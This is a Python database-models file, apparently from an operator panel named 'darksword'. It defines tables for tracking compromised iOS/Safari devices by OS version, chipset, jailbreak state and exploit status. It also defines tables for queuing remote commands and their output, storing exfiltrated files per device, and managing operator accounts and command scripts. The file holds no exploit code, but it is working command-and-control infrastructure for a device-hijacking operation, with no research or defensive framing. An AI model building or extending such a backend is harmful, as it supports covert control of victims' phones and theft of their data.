from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, Session
from datetime import datetime
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
DATABASE_URL = f"sqlite:///{PROJECT_ROOT / 'darksword.db'}"

engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class Log(Base):
    __tablename__ = "logs"
    
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.now)
    ip = Column(String(50))
    method = Column(String(10))
    path = Column(String(255))
    status_code = Column(Integer)
    content_length = Column(Integer)
    user_agent = Column(String(500))
    log_type = Column(String(20))
    device_uuid = Column(String(100), index=True, nullable=True)


class Device(Base):
    __tablename__ = "devices"
    
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), unique=True, index=True)
    first_seen = Column(DateTime, default=datetime.now)
    last_seen = Column(DateTime, default=datetime.now)
    ip = Column(String(50))
    user_agent = Column(String(500))
    status = Column(String(20), default="active")
    os_version = Column(String(50))
    safari_version = Column(String(50))
    device_model = Column(String(100))
    chipset = Column(String(100))
    jailbroken = Column(String(10), default="unknown")
    exploit_status = Column(String(20), default="pending")
    last_command_time = Column(DateTime)
    group_id = Column(Integer, index=True, nullable=True)
    note = Column(String(500), nullable=True)


class DeviceGroup(Base):
    __tablename__ = "device_groups"

    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(100), unique=True, index=True, nullable=False)
    color = Column(String(20), default="#409EFF")
    description = Column(String(500), nullable=True)
    created_at = Column(DateTime, default=datetime.now)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)


class Command(Base):
    __tablename__ = "commands"
    
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), index=True)
    command = Column(Text)
    status = Column(String(20), default="pending")
    output = Column(Text)
    created_at = Column(DateTime, default=datetime.now)
    executed_at = Column(DateTime)


class ExfilData(Base):
    __tablename__ = "exfil_data"
    
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), index=True)
    category = Column(String(50))
    path = Column(String(500))
    description = Column(Text)
    file_path = Column(String(500))
    file_size = Column(Integer)
    uploaded_at = Column(DateTime, default=datetime.now)


class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(50), unique=True, index=True)
    password = Column(String(200))
    role = Column(String(20), default="operator")
    created_at = Column(DateTime, default=datetime.now)
    last_login = Column(DateTime)


class AuditLog(Base):
    __tablename__ = "audit_logs"

    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.now, index=True)
    username = Column(String(50), index=True)
    action = Column(String(50), index=True)
    resource_type = Column(String(50))
    resource_id = Column(String(100))
    detail = Column(Text)
    ip_address = Column(String(50))
    user_agent = Column(String(500))


class Notification(Base):
    __tablename__ = "notifications"

    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.now, index=True)
    title = Column(String(200))
    message = Column(Text)
    category = Column(String(50), default="info", index=True)
    is_read = Column(Integer, default=0, index=True)
    related_device_uuid = Column(String(100), nullable=True)
    related_resource_type = Column(String(50), nullable=True)
    related_resource_id = Column(String(100), nullable=True)


class Settings(Base):
    __tablename__ = "settings"

    id = Column(Integer, primary_key=True, index=True)
    key = Column(String(100), unique=True, index=True)
    value = Column(Text)
    description = Column(String(500), nullable=True)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)
    updated_by = Column(String(50), nullable=True)


class CommandScript(Base):
    __tablename__ = "command_scripts"

    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(100), unique=True, index=True)
    description = Column(String(500), nullable=True)
    command = Column(Text)
    created_at = Column(DateTime, default=datetime.now)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)


def init_db():
    Base.metadata.create_all(bind=engine)
    from sqlalchemy import text
    try:
        with engine.connect() as conn:
            cols = [r[1] if isinstance(r, tuple) else getattr(r, "name", str(r))
                    for r in conn.execute(text("PRAGMA table_info(devices)")).fetchall()]
            cols_set = set((c or "").lower() for c in cols)
            if "group_id" not in cols_set:
                conn.execute(text("ALTER TABLE devices ADD COLUMN group_id INTEGER"))
                conn.commit()
            if "note" not in cols_set:
                conn.execute(text("ALTER TABLE devices ADD COLUMN note VARCHAR(500)"))
                conn.commit()
    except Exception:
        pass


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def create_audit_log(db: Session, username: str, action: str, resource_type: str = None,
                     resource_id: str = None, detail: str = None, ip_address: str = None,
                     user_agent: str = None):
    """辅助函数：创建审计日志记录."""
    try:
        log = AuditLog(
            username=username,
            action=action,
            resource_type=resource_type,
            resource_id=str(resource_id) if resource_id is not None else None,
            detail=detail,
            ip_address=ip_address,
            user_agent=user_agent
        )
        db.add(log)
        db.commit()
    except Exception:
        db.rollback()


def create_notification(db: Session, title: str, message: str, category: str = "info",
                        related_device_uuid: str = None, related_resource_type: str = None,
                        related_resource_id: str = None):
    """辅助函数：创建通知记录."""
    try:
        notif = Notification(
            title=title,
            message=message,
            category=category,
            related_device_uuid=related_device_uuid,
            related_resource_type=related_resource_type,
            related_resource_id=str(related_resource_id) if related_resource_id is not None else None
        )
        db.add(notif)
        db.commit()
    except Exception:
        db.rollback()
